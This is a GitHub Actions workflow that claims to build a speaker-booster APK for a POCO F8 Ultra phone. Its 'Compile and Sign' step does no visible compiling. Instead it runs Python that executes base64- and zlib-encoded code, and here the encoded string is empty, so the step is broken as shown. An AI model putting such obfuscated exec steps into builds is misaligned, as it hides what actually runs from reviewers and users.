name: Build POCO F8 Ultra Speaker Power APK

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build-apk:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Compile and Sign Android APK v7.0 Liquid Glass DSP
        run: python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('')).decode('utf-8').replace('write('+chr(34)*3,'write(r'+chr(34)*3))")

      - name: Upload Compiled APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: PocoF8Ultra-SpeakerPower-APK-v7
          path: dist/*.apk
